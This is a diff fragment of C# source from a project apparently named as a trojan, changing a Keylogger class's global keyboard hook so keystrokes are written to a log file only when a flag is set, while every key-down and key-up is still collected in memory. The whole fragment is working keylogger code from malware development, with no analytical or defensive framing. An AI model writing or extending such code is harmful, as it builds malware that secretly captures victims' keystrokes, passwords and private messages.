@@ -41,16 +41,22 @@ namespace DNAV_Trojaner
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                StreamWriter sw = new StreamWriter(Keylogger._path, true);
-                sw.WriteLine("DOWN: " + (Keys)vkCode);
-                sw.Close();
+                if (Keylogger._logFile)
+                {
+                    StreamWriter sw = new StreamWriter(Keylogger._path, true);
+                    sw.WriteLine("DOWN: " + (Keys)vkCode);
+                    sw.Close();
+                }
                 Keylogger._keys += "DOWN: " + (Keys)vkCode + "\n";
             } else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                StreamWriter sw = new StreamWriter(Keylogger._path, true);
-                sw.WriteLine("UP: " + (Keys)vkCode);
-                sw.Close();
+                if (Keylogger._logFile)
+                {
+                    StreamWriter sw = new StreamWriter(Keylogger._path, true);
+                    sw.WriteLine("UP: " + (Keys)vkCode);
+                    sw.Close();
+                }
                 Keylogger._keys += "UP: " + (Keys)vkCode + "\n";
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
